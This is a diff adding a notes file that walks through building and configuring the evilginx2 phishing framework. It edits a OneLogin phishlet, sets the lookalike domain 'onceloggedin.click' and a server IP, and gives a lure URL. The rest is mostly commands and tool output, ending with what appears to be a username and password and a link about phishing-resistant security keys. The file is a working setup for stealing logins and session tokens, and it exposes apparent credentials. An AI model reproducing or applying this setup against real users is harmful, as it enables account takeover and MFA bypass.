@@ -1,0 +1,84 @@
+sudo apt-get update
+
+sudo apt-get upgrade
+
+sudo apt install make
+sudo apt install make-doc
+
+wget https://go.dev/dl/go1.19.6.linux-amd64.tar.gz
+
+─$ sha256sum go1.19.6.linux-amd64.tar.gz
+e3410c676ced327aec928303fef11385702a5562fd19d9a1750d5a2979763c3d  go1.19.6.linux-amd64.tar.gz
+
+ sudo tar -C /usr/local/ -xzf go1.19.6.linux-amd64.tar.gz
+
+ sudo nano /etc/profile
+add
+export PATH=$PATH:/usr/local/go/bin
+to the end 
+
+
+source /etc/profile
+go version
+
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+git reset --hard 511860c
+make
+
+edit the onelogin phishlet
+ sudo ./bin/evilginx -p phishlets
+
+
+                                             ___________      __ __           __
+                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
+                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
+                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    <
+                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
+                                                     \/              /_____/         \/      \/
+
+                                                          - --  Gone Phishing  -- -
+
+                                               by Kuba Gretzky (@mrgretzky)     version 2.4.2
+
+
+[06:55:42] [inf] loading phishlets from: phishlets
+[06:55:42] [inf] loading configuration from: /root/.evilginx
+[06:55:42] [inf] blacklist: loaded 0 ip addresses or ip masks
+
++-----------------+-------------------+-----------+------------+-----------+
+|    phishlet     |      author       |  active   |  status    | hostname  |
++-----------------+-------------------+-----------+------------+-----------+
+| linkedin        | @mrgretzky        | disabled  | available  |           |
+| okta            | @mikesiegel       | disabled  | available  |           |
+| booking         | @Anonymous        | disabled  | available  |           |
+| amazon          | @customsync       | disabled  | available  |           |
+| onelogin        | @perfectlylog...  | disabled  | available  |           |
+| twitter-mobile  | @white_fi         | disabled  | available  |           |
+| twitter         | @white_fi         | disabled  | available  |           |
+| airbnb          | @AN0NUD4Y         | disabled  | available  |           |
+| o365            | @jamescullum      | disabled  | available  |           |
+| paypal          | @An0nud4y         | disabled  | available  |           |
+| tiktok          | @An0nUD4Y         | disabled  | available  |           |
+| wordpress.org   | @meitar           | disabled  | available  |           |
+| facebook        | @charlesbel       | disabled  | available  |           |
+| coinbase        | @An0nud4y         | disabled  | available  |           |
+| github          | @audibleblink     | disabled  | available  |           |
+| instagram       | @charlesbel       | disabled  | available  |           |
+| outlook         | @mrgretzky        | disabled  | available  |           |
+| protonmail      | @jamescullum      | disabled  | available  |           |
+| reddit          | @customsync       | disabled  | available  |           |
+| citrix          | @424f424f         | disabled  | available  |           |
++-----------------+-------------------+-----------+------------+-----------+
+
+: config domain onceloggedin.click
+[06:56:08] [inf] server domain set to: onceloggedin.click
+: config ip 18.116.120.169
+[06:56:28] [inf] server IP set to: 18.189.143.232
+:
+
+https://onceloggedin.click/zcRdWdci
+
+dylan-stanton-mugenv 
+ETNa9vWaw9Ld3p
+https://www.yubico.com/blog/creating-unphishable-security-key/
